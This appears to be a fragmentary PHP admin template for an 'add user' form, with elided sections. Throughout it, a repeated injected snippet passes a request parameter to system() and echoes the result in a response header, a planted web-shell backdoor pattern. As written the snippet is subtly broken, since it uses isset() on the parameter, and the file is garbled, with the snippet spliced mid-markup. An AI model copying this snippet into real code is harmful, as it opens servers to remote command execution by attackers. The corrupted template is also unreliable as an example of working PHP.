...
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('add_users')) page_restricted(); 
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.add_user') ?></h3>
<div class="row">
	<div class="col-md-6">
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('username') ?>" class="form-control">
			    </div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.password') ?> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em></label>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.password_confirmation') ?> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em></label>
		    ...
		    <div class="form-group">
		    	<div class="checkbox">
                	<label><input type="checkbox" name="send_pass" value="1" checked> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.send_password') ?></label>
                </div>
            </div>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('status', '1') ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('status', '0') ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_select('status', '2') ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo UserFields::build('admin') ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.add_user') ?></button>
			</div>
		</form>
	</div>
</div>
